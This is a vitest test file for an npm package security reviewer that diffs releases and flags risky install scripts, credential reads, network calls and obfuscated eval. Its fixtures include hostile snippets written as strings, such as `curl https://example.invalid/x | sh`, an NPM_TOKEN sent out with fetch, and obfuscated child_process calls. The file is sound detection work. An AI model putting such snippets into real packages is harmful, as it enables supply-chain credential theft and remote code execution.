import { describe, expect, test } from "vitest";
import {
  annotateFindingsWithDiffStatus,
  computeRisk,
  createPackageDiff,
  deterministicFindings,
  tarSuspiciousEntryFindings,
} from "../server/lib/review";
import {
  distinctTokenText,
  loadCallArgumentText,
  neverSampledBundleSeverity,
  reviewEntrypoint,
  runUnderHeapLimit,
} from "./helpers/heap-limited-review.mjs";

describe("review", () => {
  test("diff highlights added modified and removed package files", () => {
    const before = [
      {
        path: "package.json",
        size: 40,
        sha256: "a",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0" }),
      },
      { path: "index.js", size: 10, sha256: "b", flags: [], textSample: "export {}" },
      { path: "old.js", size: 10, sha256: "c", flags: [], textSample: "" },
    ];
    const staged = [
      {
        path: "package.json",
        size: 70,
        sha256: "d",
        flags: [],
        textSample: JSON.stringify({
          name: "pkg",
          version: "1.0.1",
          scripts: { postinstall: "node install.js" },
        }),
      },
      { path: "index.js", size: 10, sha256: "b", flags: [], textSample: "export {}" },
      {
        path: "install.js",
        size: 30,
        sha256: "e",
        flags: [],
        textSample: "require('child_process').execSync('curl https://x')",
      },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "install.js")?.status).toBe("added");
    expect(diff.find((entry) => entry.path === "package.json")?.status).toBe("modified");
    expect(diff.find((entry) => entry.path === "old.js")?.status).toBe("removed");
    expect(diff.find((entry) => entry.path === "index.js")?.status).toBe("unchanged");
  });

  test("diff treats skipped file content as modified when hashes are missing (legacy artifacts)", () => {
    const before = [
      {
        path: "bin/native.node",
        size: 50_000_000,
        sha256: "",
        flags: ["content-skipped"],
      },
    ];
    const staged = [
      {
        path: "bin/native.node",
        size: 50_000_000,
        sha256: "",
        flags: ["content-skipped"],
      },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "bin/native.node")).toMatchObject({
      status: "modified",
      flags: ["content-skipped"],
    });
  });

  test("diff proves a skipped file unchanged when its streamed hashes match", () => {
    // Skipped bodies are hashed while being discarded, so equal real hashes
    // mean the uninspected binary is byte-identical to the published baseline.
    const hash = "a".repeat(64);
    const before = [
      { path: "bin/native.node", size: 50_000_000, sha256: hash, flags: ["content-skipped"] },
    ];
    const staged = [
      { path: "bin/native.node", size: 50_000_000, sha256: hash, flags: ["content-skipped"] },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "bin/native.node")).toMatchObject({
      status: "unchanged",
      flags: ["content-skipped"],
    });
  });

  test("diff marks a skipped file modified when its streamed hashes differ", () => {
    const before = [
      {
        path: "bin/native.node",
        size: 50_000_000,
        sha256: "a".repeat(64),
        flags: ["content-skipped"],
      },
    ];
    const staged = [
      {
        path: "bin/native.node",
        size: 50_000_001,
        sha256: "b".repeat(64),
        flags: ["content-skipped"],
      },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "bin/native.node")?.status).toBe("modified");
  });

  test("a clipped baseline sample stays out of the canonical diff entry", () => {
    // DiffEntry.flags is report data (summary_json.diff, R2 diff.json, the
    // exported report.json). The baseline-side retention cap is a fact about the
    // published version's parse, not about the reviewed release, so a big
    // unchanged file must not come back looking clipped.
    const hash = "c".repeat(64);
    const before = [
      {
        path: "dist/bundle.js",
        size: 3 * 1024 * 1024,
        sha256: hash,
        flags: ["baseline-truncated"],
        textSample: "export const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "dist/bundle.js",
        size: 3 * 1024 * 1024,
        sha256: hash,
        flags: [],
        textSample: "export const value = 1;\n",
      },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "dist/bundle.js")).toMatchObject({
      status: "unchanged",
      flags: [],
    });
  });

  test("a modified file keeps its own flags while dropping baseline retention flags", () => {
    const before = [
      {
        path: "dist/bundle.js",
        size: 3 * 1024 * 1024,
        sha256: "a".repeat(64),
        flags: ["baseline-truncated"],
      },
    ];
    const staged = [
      {
        path: "dist/bundle.js",
        size: 3 * 1024 * 1024,
        sha256: "b".repeat(64),
        flags: ["truncated"],
      },
    ];

    const diff = createPackageDiff(before, staged);

    // The staged side's display truncation is real and still reported.
    expect(diff.find((entry) => entry.path === "dist/bundle.js")).toMatchObject({
      status: "modified",
      flags: ["truncated"],
    });
  });

  test("deterministic policy escalates risky new staged changes", () => {
    const staged = [
      {
        path: "package.json",
        size: 70,
        sha256: "d",
        flags: [],
        textSample: JSON.stringify({ scripts: { preinstall: "node install.js" } }),
      },
      {
        path: "install.js",
        size: 30,
        sha256: "e",
        flags: [],
        textSample: "process.env.NPM_TOKEN; new Function('return 1')",
      },
    ];
    const diff = createPackageDiff([], staged);
    const findings = deterministicFindings(staged, diff);

    expect(computeRisk(findings)).toBe("critical");
    expect(findings.some((finding) => finding.evidence.includes("preinstall"))).toBe(true);
    expect(findings.some((finding) => finding.evidence.includes("secret/environment access"))).toBe(
      true,
    );
  });

  test("escalates root gyp command substitution that executes package JavaScript", () => {
    const previous = [
      {
        path: "package.json",
        size: 42,
        sha256: "prev-package-json",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0" }),
      },
    ];
    const staged = [
      {
        path: "package.json",
        size: 42,
        sha256: "staged-package-json",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      {
        path: "binding.gyp",
        size: 157,
        sha256: "binding-gyp",
        flags: [],
        textSample:
          '{\n  "targets": [{\n    "target_name": "Setup",\n    "type": "none",\n    "sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]\n  }]\n}\n',
      },
      {
        path: "index.js",
        size: 160,
        sha256: "index-js",
        flags: [],
        textSample:
          "eval(function rotate(payload) { return payload; }('defanged payload placeholder'));\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff(previous, staged));

    expect(computeRisk(findings)).toBe("critical");
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "install-script.implicit-node-gyp",
          severity: "high",
          file: "binding.gyp",
        }),
        expect.objectContaining({
          ruleId: "install-script.gyp-command-substitution",
          severity: "critical",
          file: "binding.gyp",
          line: 5,
        }),
      ]),
    );
  });

  test("flags extensionless native binaries via parser magic-byte flags with sha256 evidence", () => {
    // The Windows-skew regression: the .exe matched the extension check, but
    // the same release's extensionless Linux/macOS binaries were invisible.
    const staged = [
      {
        path: "bin/cli-windows-x64.exe",
        size: 23068672,
        sha256: "windows-pe-hash",
        flags: ["content-skipped", "native-pe"],
      },
      {
        path: "bin/cli-linux-x64",
        size: 22020096,
        sha256: "linux-elf-hash",
        flags: ["content-skipped", "native-elf"],
      },
      {
        path: "bin/cli-darwin-arm64",
        size: 20971520,
        sha256: "darwin-macho-hash",
        flags: ["content-skipped", "native-macho"],
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));
    const native = findings.filter((finding) => finding.ruleId === "file.native-artifact");

    expect(native).toHaveLength(3);
    expect(native).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          severity: "high",
          file: "bin/cli-linux-x64",
          evidence: "ELF executable (magic bytes); sha256 linux-elf-hash",
        }),
        expect.objectContaining({
          severity: "high",
          file: "bin/cli-darwin-arm64",
          evidence: "Mach-O executable (magic bytes); sha256 darwin-macho-hash",
        }),
        expect.objectContaining({
          severity: "high",
          file: "bin/cli-windows-x64.exe",
          evidence: "Windows PE/DOS executable (magic bytes); sha256 windows-pe-hash",
        }),
      ]),
    );
    // The oversized additions also raise diff.large-new-file with the staged hash.
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "diff.large-new-file",
          severity: "medium",
          file: "bin/cli-linux-x64",
          evidence: "22020096 byte new file; sha256 linux-elf-hash",
        }),
      ]),
    );
  });

  test("extension-matched native artifacts keep firing without magic flags and carry sha256", () => {
    const staged = [
      {
        path: "prebuilds/linux-x64/addon.node",
        size: 2048576,
        sha256: "addon-hash",
        flags: ["binary"],
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));
    const native = findings.filter((finding) => finding.ruleId === "file.native-artifact");

    expect(native).toHaveLength(1);
    expect(native[0]).toMatchObject({
      severity: "high",
      file: "prebuilds/linux-x64/addon.node",
      evidence: "native, wasm, or executable artifact; sha256 addon-hash",
    });
    // Extension + magic flag on the same file still yields a single finding.
    const flagged = deterministicFindings(
      [{ ...staged[0], flags: ["binary", "native-elf"] }],
      createPackageDiff([], [{ ...staged[0], flags: ["binary", "native-elf"] }]),
    );
    expect(flagged.filter((finding) => finding.ruleId === "file.native-artifact")).toHaveLength(1);
  });

  test("does not apply Python capability patterns to JavaScript packages", () => {
    const staged = [
      {
        path: "template.js",
        size: 60,
        sha256: "template",
        flags: [],
        textSample: "export function render(template) {\n  return compile(template);\n}\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "code.dynamic-evaluation")).toBe(false);
  });

  test("does not flag unchanged network-only code paths", () => {
    const previous = [
      {
        path: "link/http/createSignalIfSupported.js",
        size: 90,
        sha256: "apollo-http",
        flags: [],
        textSample: "export function createSignalIfSupported() {\n  return fetch('/graphql');\n}\n",
      },
    ];
    const staged = [...previous];
    const findings = deterministicFindings(staged, createPackageDiff(previous, staged), {
      name: "@apollo/client",
      version: "4.2.0",
    });

    expect(findings.some((finding) => finding.ruleId === "code.network-access")).toBe(false);
  });

  test("flags added network-only code paths as contextual", () => {
    const staged = [
      {
        path: "lib/update.js",
        size: 90,
        sha256: "network-only",
        flags: [],
        textSample:
          "import https from 'https';\nhttps.request('https://example.invalid/payload').end();\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.network-access",
          severity: "medium",
          file: "lib/update.js",
        }),
      ]),
    );
  });

  test("still flags network-capable lifecycle script files", () => {
    const staged = [
      {
        path: "package.json",
        size: 80,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ scripts: { postinstall: "node scripts/install" } }),
      },
      {
        path: "scripts/install.js",
        size: 90,
        sha256: "install",
        flags: [],
        textSample: "fetch('https://example.com/payload.js');\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.network-access",
          severity: "high",
          file: "scripts/install.js",
        }),
      ]),
    );
  });

  test("does not treat fetch method declarations as network access", () => {
    const previous = [
      {
        path: "core/ObservableQuery.js",
        size: 90,
        sha256: "old",
        flags: [],
        textSample:
          "export class ObservableQuery {\n  fetchPolicy() { return 'cache-first'; }\n}\n",
      },
    ];
    const staged = [
      {
        path: "core/ObservableQuery.js",
        size: 180,
        sha256: "new",
        flags: [],
        textSample:
          "export class ObservableQuery {\n  fetchPolicy() { return 'cache-first'; }\n  fetch(options, networkStatus, fetchQuery) {\n    return fetchQuery(options, networkStatus);\n  }\n}\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff(previous, staged));

    expect(findings.some((finding) => finding.ruleId === "code.network-access")).toBe(false);
  });

  test("does not scan documentation as executable capability evidence", () => {
    const staged = [
      {
        path: "CHANGELOG.md",
        size: 160,
        sha256: "changelog",
        flags: [],
        textSample:
          "Previously no AbortController was passed to `fetch()`, so the request kept running.\n",
      },
      {
        path: "skills/apollo-client/references/integration-client.md",
        size: 160,
        sha256: "skill-doc",
        flags: [],
        textSample:
          'const token = localStorage.getItem("token");\nauthorization: token ? `Bearer ${token}` : ""\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId?.startsWith("code."))).toBe(false);
    expect(findings.some((finding) => finding.ruleId === "file.secret-content")).toBe(false);
  });

  test("excludes type declaration files from content scanning", () => {
    // .d.ts files keep a diffable sample but must not drive deterministic
    // findings: declaration syntax like `fetch(...)` is a type signature, and
    // scanning large bundled declarations is pure perf/memory cost.
    const staged = [
      {
        path: "dist/index.d.ts",
        size: 200,
        sha256: "decl",
        flags: [],
        textSample:
          "export declare function run(): void;\n" +
          "export declare const fetch: (url: string) => Promise<Response>;\n" +
          "export declare const child_process: typeof import('child_process');\n" +
          "export declare const token: 'npm_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';\n",
      },
      {
        path: "dist/index.d.mts",
        size: 80,
        sha256: "decl-mts",
        flags: [],
        textSample: "export declare const exec: (cmd: string) => void;\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId?.startsWith("code."))).toBe(false);
    expect(findings.some((finding) => finding.ruleId === "file.secret-content")).toBe(false);
  });

  test("still flags high-confidence token leaks in documentation", () => {
    const staged = [
      {
        path: "README.md",
        size: 80,
        sha256: "readme-token",
        flags: [],
        textSample: "Do not publish this npm_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA token.\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "file.secret-content",
          file: "README.md",
        }),
      ]),
    );
  });

  test("still scans executable files with documentation-like basenames", () => {
    const staged = [
      {
        path: "security.js",
        size: 120,
        sha256: "security-script",
        flags: [],
        textSample:
          "const token = process.env.NPM_TOKEN;\nfetch('https://example.invalid', { body: token });\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.credential-access",
          file: "security.js",
        }),
        expect.objectContaining({
          ruleId: "code.network-access",
          file: "security.js",
        }),
      ]),
    );
  });

  test("does not treat common JS env flags as credential access", () => {
    const staged = [
      {
        path: "index.js",
        size: 180,
        sha256: "env-flags",
        flags: [],
        textSample:
          "const mode = process.env.NODE_ENV;\nif (import.meta.env.DEV || process.env['CI']) fetch('https://example.invalid/ping');\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "code.credential-access")).toBe(false);
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.network-access",
          severity: "medium",
          file: "index.js",
        }),
      ]),
    );
  });

  test("keeps credential finding lines stable when a multiline env access is stripped", () => {
    // The allowlist strip erases `process.env\n  .npm_command` across the line
    // break; if it also swallowed the newline, the authToken read below would be
    // reported at line 2 instead of its real line 3.
    const staged = [
      {
        path: "index.js",
        size: 92,
        sha256: "multiline-env",
        flags: [],
        textSample:
          "const a = process.env\n  .npm_command;\nconst b = process.env.npm_config__authToken;\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
      severity: "high",
      file: "index.js",
      line: 3,
    });
  });

  test("still flags token reads next to common env flags", () => {
    const staged = [
      {
        path: "index.js",
        size: 180,
        sha256: "env-token",
        flags: [],
        textSample:
          "const mode = process.env.NODE_ENV;\nconst token = process.env['NPM_TOKEN'];\nfetch('https://example.invalid', { body: token || mode });\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
      severity: "high",
      file: "index.js",
    });
  });

  test("treats tool install locations as ordinary environment reads", () => {
    const credentialFindings = (textSample) => {
      const staged = [{ path: "index.js", size: 80, sha256: "loc", flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "code.credential-access",
      );
    };

    expect(
      credentialFindings("const yarn = process.env.HADOOP_HOME ? 'yarnpkg' : 'yarn';\n"),
    ).toEqual([]);
    expect(credentialFindings("const java = process.env['JAVA_HOME'];\n")).toEqual([]);
    expect(credentialFindings("const g = process.env.GRADLE_USER_HOME;\n")).toEqual([]);
    expect(credentialFindings("const home = process.env.HOME;\n")).toEqual([]);
    expect(credentialFindings("const t = process.env.NPM_TOKEN_HOMEPAGE;\n")).toHaveLength(1);
  });

  test("reads of named configuration variables are not credential access", () => {
    const credentialFindings = (textSample, path = "index.js") => {
      const staged = [{ path, size: textSample.length, sha256: "cfg", flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "code.credential-access",
      );
    };

    for (const textSample of [
      "if (process.env.NAPI_RS_NATIVE_LIBRARY_PATH) load(process.env.NAPI_RS_NATIVE_LIBRARY_PATH);\n",
      "const port = process.env.PORT || 1234;\nprocess.env.PATH = `${bin}:${process.env.PATH}`;\n",
      "const dir = process.env['XDG_RUNTIME_DIR'] ?? process.env.XDG_CONFIG_HOME;\n",
      "const proxy = process.env.npm_config_https_proxy || process.env.npm_config_user_agent;\n",
      "const { APPDATA = join(home, 'AppData'), OSTYPE } = process.env;\n",
      "const a = process.env.GIT_AUTHOR_NAME, t = process.env.TOKENIZERS_PARALLELISM, k = process.env.KEYBOARD_LAYOUT;\n",
      "const flag = process.env.NEXT_PRIVATE_LOCAL_DEV || process.env.GITHUB_ACTIONS || process.env.PWD;\n",
      "// process.env.PACKAGE_VERSION is injected when we publish.\nmodule.exports = 1;\n",
      "/**\n * @param {Record<string, string>} processEnv process.env object\n */\nmodule.exports = (env) => env;\n",
      // Uses of the env object that read nothing.
      "if (typeof process.env === 'object' && process.env !== undefined && !process.env.CI) x();\nconst y = void 0 !== process.env ? 1 : 2;\nif (process.env) z();\nconst t = !!process.env;\n",
      // Named reads spelled through a split line, a multi-line destructuring, an
      // alias used only for named reads, and TypeScript's optional-chain lowering.
      "const a = process.env\n  .npm_command;\nconst {\n  APPDATA = '',\n  PORT: port,\n} = process.env;\n",
      "const env = process.env;\nif ('NO_COLOR' in env) x();\nconst wt = !!env.WT_SESSION || !!env.TERM_SESSION_ID || env['CI'];\n",
      "const mode = (null == process ? void 0 : process.env)?.NODE_ENV;\n",
      "var _a;\nconst m = (_a = process === null || process === void 0 ? void 0 : process.env) === null || _a === void 0 ? void 0 : _a.NODE_ENV;\n",
    ]) {
      expect(credentialFindings(textSample), textSample).toEqual([]);
    }
  });

  test("environment mentions in comments are not credential access", () => {
    const credential = (path, textSample) => {
      const staged = [{ path, size: textSample.length, sha256: "c", flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
        (finding) => finding.ruleId === "code.credential-access",
      );
    };
    const jsdoc =
      "/**\n * Has no effect on `process.env`; the caller decides what to do with it.\n */\n";
    const astroComment =
      "---\n// do not access env variables using import.meta.env[varname]\nconst id = import.meta.env.PUBLIC_ID;\n---\n<div>{id}</div>\n";
    // Past the constant folder's 512 KB cap, as in bundled chunks.
    const filler = `const pad = 0;\n`.repeat(40 * 1024);

    expect(credential("lib/index.js", `${jsdoc}module.exports = 1;\n`)).toEqual([]);
    expect(credential("dist/chunk.js", `${filler}${jsdoc}module.exports = 1;\n`)).toEqual([]);
    expect(credential("src/index.astro", astroComment)).toEqual([]);
    // A real use with a trailing comment on the same line still counts.
    expect(
      credential("lib/index.js", "const all = { ...process.env }; // snapshot for debugging\n"),
    ).toHaveLength(1);
    expect(
      credential("dist/chunk.js", `${filler}send(process.env); // process.env is fine\n`),
    ).toHaveLength(1);
    expect(
      credential("src/index.astro", "---\nconst v = import.meta.env[name]; // computed\n---\n"),
    ).toHaveLength(1);
  });

  test("the line-comment pass keeps template substitutions on comment-looking lines", () => {
    const ruleIds = (path, textSample) => {
      const staged = [{ path, size: textSample.length, sha256: "t", flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).map(
        (finding) => finding.ruleId,
      );
    };
    const payloads = [
      ["code.dynamic-evaluation", "const a = `\n// ${eval(atob(blob))}\n`;\n"],
      ["code.network-access", "const b = `\n// ${fetch(u)}\n`;\n"],
      ["code.credential-access", "const c = `\n// ${JSON.stringify(process.env)}\n`;\n"],
    ];
    for (const path of ["src/App.vue", "src/App.svelte"]) {
      for (const [ruleId, payload] of payloads) {
        expect(ruleIds(path, `<script>\n${payload}</script>\n`), path).toContain(ruleId);
      }
    }
    // Past the 4 MB lexing cap: one large file carrying all three.
    const filler = `const pad = 0;\n`.repeat(300 * 1024);
    expect(ruleIds("dist/huge.js", filler + payloads.map(([, p]) => p).join(""))).toEqual(
      expect.arrayContaining(payloads.map(([ruleId]) => ruleId)),
    );
  }, 60_000);

  test("the line-comment pass leaves component markup and JSX alone", () => {
    const ruleIds = (path, textSample) => {
      const staged = [{ path, size: textSample.length, sha256: "m", flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).map(
        (finding) => finding.ruleId,
      );
    };
    const svelteScript = "<script>\n  let u = '/x', m = 'POST';\n</script>\n";
    expect(
      ruleIds(
        "src/App.svelte",
        `${svelteScript}<p>\n// {fetch(u,{method:m,body:JSON.stringify(process.env)})}\n</p>\n`,
      ),
    ).toEqual(expect.arrayContaining(["code.network-access", "code.credential-access"]));
    expect(ruleIds("src/App.svelte", `${svelteScript}<p>\n// {eval(atob(u))}\n</p>\n`)).toContain(
      "code.dynamic-evaluation",
    );
    expect(
      ruleIds("src/App.vue", "<template>\n  <p>\n// {{ fetch(u) }}\n  </p>\n</template>\n"),
    ).toContain("code.network-access");
    // Past the 4 MB lexing cap the view is raw: JSX text and a `//` line inside
    // a template literal both stay.
    const filler = `const pad = 0;\n`.repeat(300 * 1024);
    expect(
      ruleIds(
        "dist/huge.jsx",
        `${filler}const el = (\n  <p>\n// {fetch(u)}\n  </p>\n);\nconst t = \`\n// eval(p)\n\`;\n`,
      ),
    ).toEqual(expect.arrayContaining(["code.network-access", "code.dynamic-evaluation"]));
    // A `//` line inside a template literal in a script region is template
    // text an eval can run, in every component flavour.
    const templated = "const step = `\n// fetch(target, init)\n`;\neval(step.slice(2));\n";
    for (const [path, source] of [
      ["src/App.svelte", `<script>\n${templated}</script>\n<p>hi</p>\n`],
      ["src/App.vue", `<script setup>\n${templated}</script>\n<template><p>hi</p></template>\n`],
      ["src/Page.astro", `---\n${templated}---\n<p>hi</p>\n`],
    ]) {
      expect(ruleIds(path, source), path).toEqual(
        expect.arrayContaining(["code.network-access", "code.dynamic-evaluation"]),
      );
    }
    // A `<script>` inside an HTML comment opens a false region over markup;
    // nothing in that markup is blanked.
    expect(
      ruleIds(
        "src/App.svelte",
        "<!-- <script> -->\n<p>it's\n// {eval(atob(u))}\n</p>\n<script>\nlet u;\n</script>\n",
      ),
    ).toContain("code.dynamic-evaluation");
    // Once markup starts, a `<script>` in an HTML comment, an attribute value or
    // an expression string opens no region, so a directive line stays.
    const directive = "  <button\n// @click=fetch(u)\n  >go</button>\n";
    const script = "<script setup>\nconst u = '/x';\n</script>\n";
    for (const [path, source] of [
      ["src/App.vue", `<template>\n  <!-- <script> -->\n${directive}</template>\n${script}`],
      [
        "src/App.vue",
        `<template>\n  <p title="<script>">hi</p>\n${directive}</template>\n${script}`,
      ],
      ["src/App.svelte", `<p>{'<script>'}</p>\n${directive}${script}`],
      [
        "src/Page.astro",
        `---\nconst u = '/x';\n---\n<p title="<script>">hi</p>\n${directive}${script}`,
      ],
      // A `---` line inside a frontmatter template is not the closing fence.
      ["src/Page.astro", "---\nconst t = `\n---\n<script>\n// fetch(u)\n</script>\n`;\n---\n"],
    ]) {
      expect(ruleIds(path, source), source).toContain("code.network-access");
    }
    // Comments inside a component's leading script blocks are still blanked.
    expect(
      ruleIds("src/App.svelte", "<script>\n// reads process.env[name] at build time\n</script>\n"),
    ).toEqual([]);
    expect(
      ruleIds(
        "src/App.svelte",
        '<script context="module">\nexport const a = 1;\n</script>\n<script lang="ts">\n// reads process.env[name] at build time\n</script>\n<p>hi</p>\n',
      ),
    ).toEqual([]);
    expect(
      ruleIds("src/Page.astro", "---\n// do not use import.meta.env[varname]\n---\n<p>hi</p>\n"),
    ).toEqual([]);
  }, 60_000);

  test("JSX text never opens a comment in the code view", () => {
    const ruleIds = (path, textSample) => {
      const staged = [{ path, size: textSample.length, sha256: "x", flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).map(
        (finding) => finding.ruleId,
      );
    };
    const spanning =
      "const A = () => <p>/*</p>;\nconst s = JSON.stringify(process.env);\n" +
      "fetch('https://x.invalid', {method:'POST', body:s});\neval(atob(p));\n" +
      "const B = () => <p>*/</p>;\n";
    for (const path of ["src/A.tsx", "src/A.jsx", "lib/a.js"]) {
      expect(ruleIds(path, spanning), path).toEqual(
        expect.arrayContaining([
          "code.network-access",
          "code.credential-access",
          "code.dynamic-evaluation",
        ]),
      );
      for (const line of [
        "const A = () => <p>see // {fetch(u)}</p>;\n",
        "const A = () => <p>/* {fetch(u)} */</p>;\n",
        "const A = () => <div><br/>/*</div>; fetch(u); /**/\n",
      ]) {
        expect(ruleIds(path, line), `${path}: ${line}`).toContain("code.network-access");
      }
    }
  });

  test("the code view and the constant fold stay near-linear on deep nesting and arrow chains", () => {
    const ruleIds = (path, textSample) => {
      const staged = [{ path, size: textSample.length, sha256: "q", flags: [], textSample }];
      return deterministicFindings(staged, createPackageDiff([], staged)).map(
        (finding) => finding.ruleId,
      );
    };
    const deep = `x=${"[".repeat(20_000)}${"]".repeat(20_000)};\n`;
    const template = `\`${"${0}".repeat(1_000)}\`;`;
    // About 505 KB each, under the fold's cap: contextual bindings at 2,000 and
    // 5,000 depths, then a `${` or a `yield` lookup on every few bytes.
    const catchTemplates = `${"catch(await){".repeat(2_000)}${template.repeat(120)}${"}".repeat(2_000)}\n`;
    const letLookups = `${"{let await;".repeat(5_000)}${"yield;".repeat(74_000)}${"}".repeat(5_000)}\n`;
    // 500 KB, under the fold's 512 KB cap, so the fold runs too.
    const arrows = `const f = ${"(a)=>".repeat(100_000)}0;\n`;
    for (const [path, source, ruleId] of [
      ["lib/a.js", `fetch(u)\n${"(a)=>".repeat(120_000)}`, "code.network-access"],
      ["lib/b.js", `${deep}fetch(u);\n`, "code.network-access"],
      ["lib/e.js", `${catchTemplates}globalThis['ev'+'al'](atob(p));\n`, "code.dynamic-evaluation"],
      ["lib/f.js", `${letLookups}globalThis['ev'+'al'](atob(p));\n`, "code.dynamic-evaluation"],
      ["lib/c.js", `${deep}globalThis['ev'+'al'](atob(p));\n`, "code.dynamic-evaluation"],
      [
        "lib/d.js",
        `${arrows}require('chi'+'ld_process')['exec'+'Sync'](atob(p));\n`,
        "code.process-execution",
      ],
      [
        "src/App.svelte",
        `<script>\nfetch(u)\n${"/**/".repeat(64_000)}</script>\n`,
        "code.network-access",
      ],
    ]) {
      const start = performance.now();
      expect(ruleIds(path, source), path).toContain(ruleId);
      // Generous: well under a second here, against seconds to minutes before.
      expect(performance.now() - start, path).toBeLessThan(15_000);
    }
  }, 120_000);

  test("nested template markers past the view budget fall back to raw text", () => {
    const textSample = "`${".repeat(1_300_000);
    const staged = [
      { path: "dist/nest.js", size: textSample.length, sha256: "n", flags: [], textSample },
    ];
    const heapBefore = process.memoryUsage().heapUsed;
    const started = performance.now();
    deterministicFindings(staged, createPackageDiff([], staged));
    expect(performance.now() - started).toBeLessThan(10_000);
    expect(process.memoryUsage().heapUsed - heapBefore).toBeLessThan(512 * 1024 * 1024);
  }, 60_000);

  test("load-call arguments full of distinct tokens keep only names a file can be looked up by", async () => {
    // Keeping one string per argument token outgrows an 80 MB heap.
    await expect(runUnderHeapLimit("loadCallArguments", 80)).resolves.toBeGreaterThanOrEqual(0);
    const payload = "require('child_process').execSync('curl https://example.invalid/x | sh');\n";
    const data = [{ path: "data.map", size: 1, sha256: "m", flags: [], textSample: payload }];
    const remoteShell = (text) =>
      reviewEntrypoint(text, data).some(
        (finding) => finding.ruleId === "code.remote-shell" && finding.file === "data.map",
      );
    const calls = loadCallArgumentText(100_000);
    expect(remoteShell(calls)).toBe(false);
    expect(remoteShell(`${calls}require('./DATA.map');\n`)).toBe(true);
  }, 60_000);

  test("looks for thousands of unlisted doc names in megabytes of near-miss code in linear time", () => {
    const record = (path, textSample) => ({ path, size: 1, sha256: path, flags: [], textSample });
    const manifest = { name: "pkg", version: "1.0.0", main: "index.js", files: ["index.js"] };
    // Every position starts a near miss of every `zq<n>.md`, which a substring
    // search per doc pays for in full.
    const staged = [
      record("package.json", JSON.stringify(manifest)),
      record("index.js", `${"zq".repeat(4_000_000)}\nread("ZQ7.md");\n`),
      ...Array.from({ length: 4_000 }, (_, index) => record(`docs/zq${index}.md`, "# notes")),
    ];
    const started = performance.now();
    const outside = deterministicFindings(staged, createPackageDiff([], staged)).filter(
      (finding) => finding.ruleId === "file.outside-files-list",
    );
    expect(performance.now() - started).toBeLessThan(8_000);
    expect(outside).toHaveLength(4_000);
    expect(
      outside.filter((finding) => finding.severity !== "low").map((finding) => finding.file),
    ).toEqual(["docs/zq7.md"]);
  }, 60_000);

  test("unlisted docs keep their severity once looking for their names runs out of budget", () => {
    const record = (path, textSample) => ({ path, size: 1, sha256: path, flags: [], textSample });
    const manifest = { name: "pkg", version: "1.0.0", main: "index.js", files: ["index.js"] };
    // Sixty name lengths end at every `.md`, so each mention costs every one.
    const docs = Array.from({ length: 60 }, (_, index) =>
      record(`docs/${"n".repeat(index + 1)}.md`, "# notes"),
    );
    const severities = (mentions) => {
      const staged = [
        record("package.json", JSON.stringify(manifest)),
        record("index.js", ".md ".repeat(mentions)),
        ...docs,
      ];
      return new Set(
        deterministicFindings(staged, createPackageDiff([], staged))
          .filter((finding) => finding.ruleId === "file.outside-files-list")
          .map((finding) => finding.severity),
      );
    };
    expect(severities(100)).toEqual(new Set(["low"]));
    expect(severities(20_000)).toEqual(new Set(["high"]));
  });

  test("a manifest with millions of export targets still reviews", () => {
    const targets = Array.from({ length: 2_000_000 }, (_, index) => `./f${index}.js`);
    const manifest = JSON.stringify({ name: "pkg", version: "1.0.0", exports: targets });
    const staged = [
